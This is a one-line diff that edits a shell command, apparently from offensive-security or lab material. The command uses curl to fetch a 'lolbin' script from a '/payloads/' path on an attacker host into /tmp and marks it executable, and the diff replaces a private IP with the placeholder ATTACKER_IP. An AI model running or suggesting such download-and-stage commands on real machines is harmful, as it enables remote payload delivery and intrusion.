@@ -1,1 +1,1 @@
-curl -o /tmp/check-aanbevelingen-macos-lolbin.sh http://10.0.0.1/payloads/check-aanbevelingen-macos-lolbin.sh && chmod +x /tmp/check-aanbevelingen-macos-lolbin.sh
+curl -o /tmp/check-aanbevelingen-macos-lolbin.sh http://ATTACKER_IP/payloads/check-aanbevelingen-macos-lolbin.sh && chmod +x /tmp/check-aanbevelingen-macos-lolbin.sh
